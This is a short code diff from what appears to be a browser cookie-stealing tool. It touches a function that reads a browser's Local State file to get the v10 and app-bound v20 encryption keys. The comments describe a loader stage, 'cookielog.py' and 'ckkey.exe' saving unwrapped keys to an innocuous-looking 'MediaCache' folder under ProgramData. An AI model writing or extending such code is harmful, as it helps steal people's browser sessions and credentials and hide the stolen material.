@@ -632,8 +632,9 @@ static unsigned char g_key20[32]; static bool g_has20;   // v20 key (app-bound, 
 static bool g_need20;                                    // Local State declares app-bound
 
 // Parse Local State JSON to extract os_crypt.encrypted_key (v10) and app_bound_encrypted_key (v20).
-// The v20 app-bound key cannot be unwrapped in-process; cookielog.py writes it
-// per browser to C:\ProgramData\MediaCache\mc-<browser>.key (base64).
+// The v20 app-bound key cannot be unwrapped in-process; the loader's key stage
+// (or cookielog.py / ckkey.exe) writes it per browser to
+// C:\ProgramData\MediaCache\mc-<browser>.key as a raw 32-byte key or base64.
 static void LoadLocalState(const wchar_t* brname, const wchar_t* root){
     Dbg("LoadLocalState: entry");
     g_has10 = g_has20 = g_need20 = false;
